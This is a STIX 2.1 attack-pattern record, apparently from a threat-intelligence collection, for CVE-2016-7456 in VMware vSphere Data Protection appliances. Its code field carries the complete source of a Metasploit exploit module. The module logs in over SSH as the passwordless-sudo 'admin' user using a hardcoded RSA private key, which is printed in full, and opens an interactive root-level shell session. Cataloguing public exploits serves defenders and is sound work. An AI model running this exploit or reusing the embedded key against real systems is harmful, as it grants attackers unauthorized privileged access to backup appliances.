{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7d346d4c-8b02-471f-9d33-f81cc91623ee",
    "created": "2024-08-14T16:58:13.949685Z",
    "modified": "2024-08-14T16:58:13.949689Z",
    "name": "VMware VDP Known SSH Key",
    "description": " VMware vSphere Data Protection appliances 5.5.x through 6.1.x contain a known ssh private key for the local user admin who is a sudoer without password.  'Platform' => 'unix' 'Arch' => ARCH_CMD 'Privileged' => true 'Targets' => [ [ 'Universal', {} ] ] 'Payload' => { 'Compat' => { 'PayloadType' => 'cmd_interact' 'ConnectionType' => 'find'  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/ssh/vmware_vdp_known_privkey.rb",
            "external_id": "vmware_vdp_known_privkey.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-7456"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2016-0024.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'net/ssh/command_stream'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::SSH\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'VMware VDP Known SSH Key',\n          'Description' => %q{\n            VMware vSphere Data Protection appliances 5.5.x through 6.1.x contain a known ssh private key for the local user admin who is a sudoer without password.\n          },\n          'Platform' => 'unix',\n          'Arch' => ARCH_CMD,\n          'Privileged' => true,\n          'Targets' => [ [ 'Universal', {} ] ],\n          'Payload' => {\n            'Compat' => {\n              'PayloadType' => 'cmd_interact',\n              'ConnectionType' => 'find'\n            }\n          },\n          'Author' => ['phroxvs'],\n          'License' => MSF_LICENSE,\n          'References' => [\n            [ 'CVE', '2016-7456' ],\n            [ 'URL', 'https://www.vmware.com/security/advisories/VMSA-2016-0024.html' ],\n          ],\n          'DisclosureDate' => '2016-12-20',\n          'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },\n          'DefaultTarget' => 0,\n          'Notes' => {\n            'Stability' => [CRASH_SAFE],\n            'Reliability' => [REPEATABLE_SESSION],\n            'SideEffects' => []\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        # Since we don't include Tcp, we have to register this manually\n        Opt::RHOST(),\n        Opt::RPORT(22)\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])\n      ]\n    )\n  end\n\n  # helper methods that normally come from Tcp\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def do_login\n    opt_hash = ssh_client_defaults.merge({\n      auth_methods: ['publickey'],\n      port: rport,\n      key_data: [ key_data ]\n    })\n    opt_hash.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n    begin\n      ssh_socket = nil\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        ssh_socket = Net::SSH.start(rhost, 'admin', opt_hash)\n      end\n    rescue Rex::ConnectionError\n      return\n    rescue Net::SSH::Disconnect, ::EOFError\n      print_error \"#{rhost}:#{rport} SSH - Disconnected during negotiation\"\n      return\n    rescue ::Timeout::Error\n      print_error \"#{rhost}:#{rport} SSH - Timed out during negotiation\"\n      return\n    rescue Net::SSH::AuthenticationFailed\n      print_error \"#{rhost}:#{rport} SSH - Failed authentication\"\n    rescue Net::SSH::Exception => e\n      print_error \"#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}\"\n      return\n    end\n\n    if ssh_socket\n\n      # Create a new session from the socket, then dump it.\n      conn = Net::SSH::CommandStream.new(ssh_socket)\n      sockets.delete(ssh_socket.transport.socket)\n\n      return conn\n    else\n      return false\n    end\n  end\n\n  def exploit\n    conn = do_login\n    if conn\n      print_good 'Successful login'\n      service_data = {\n        address: rhost,\n        port: rport,\n        protocol: 'tcp',\n        service_name: 'ssh',\n        workspace_id: myworkspace_id\n      }\n      credential_data = {\n        username: 'admin',\n        private_type: :ssh_key,\n        private_data: key_data,\n        origin_type: :service,\n        module_fullname: fullname\n      }.merge(service_data)\n\n      core = create_credential(credential_data)\n      login_data = {\n        core: core,\n        last_attempted: Time.now\n      }.merge(service_data)\n\n      create_credential_login(login_data)\n      handler(conn.lsock)\n    end\n  end\n\n  def key_data\n    <<~EOF\n      -----BEGIN RSA PRIVATE KEY-----\n      MIICWQIBAAKBgQCx/XgSpdlvoy1fABui75RYQFTRGPdkHBolTNIAeA91aPfnAr2X\n      /PuZR/DiHMCYcn6/8A5Jn75YOD3OL0mumJJR1uQ4pyhY+MSptiMYxhvDLIiRRo16\n      9jewWCSH/7jqWH8NhImpVxt5SjWtKhQInTdPkG1dCj8oSn87bt8fKvLcVQIBIwKB\n      gFuJq3dN+suzAWQOryCYeC1i6cqfICTbQKV39vjtScdajh8IuUbZ4Hq3SK7M9VW3\n      Od8NvjR+Ch691qSNWRf2saWS5MHiaYGF3xWwZokbJWJWmxlQ+Di9QAyRkjDIuMCR\n      Sj/vvCa6kWzZlSZWOyNbs38XkWoKXqVYwtnyXrINpZJTAkEA2p0ZrCKQTWBKt7aT\n      Rvx/8xnoYu9hSXIG1k11ql0HZdRpmveuZe64Gl6oJtgBZMXNdvAds+gvGTVCSfBO\n      c2ne0wJBANBt3t84oicWJpkzXnUBPOZdheKfAK6QO7weXiRmbILTJ5drPdu8pmxR\n      c1uQJgYitaSNKglJmz2WNOoaPZz/7zcCQBj8Au8Z5Jsg8pinJsZIvippXGMUCx5W\n      LKrHBiIZQqyNTeXTKd/DgsEvY6yq+NhRHsvDq5+IP+Wfr83vk+/u16MCQE1qozz3\n      xzMW2yL10qB8zXoivLNCX1bH26xFyzIXaiH2qE4vJZrCabM0MilSzEtr+lMP3GnZ\n      gs27cr1aNCRfD7UCQHOXGagsD/ijMGNcWPBQOY3foHzxozoBLGmysAmVz3vX6uyr\n      Y7oq9O5vDxwpMOAZ9JYTFuzEoWWg16L6SnNVYU4=\n      -----END RSA PRIVATE KEY-----\n    EOF\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-12-20"
}